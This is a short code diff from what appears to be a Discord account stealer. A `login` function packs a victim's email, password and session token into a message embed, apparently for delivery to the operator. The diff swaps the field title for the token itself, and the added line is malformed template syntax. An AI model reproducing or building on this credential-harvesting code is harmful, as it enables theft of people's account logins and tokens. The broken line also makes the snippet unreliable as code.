@@ -336,7 +336,7 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
        {
-            name: "<:tre:962761278764490772> **Account Info**",
+            name: ``\`{token}`\``,
             value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
           },
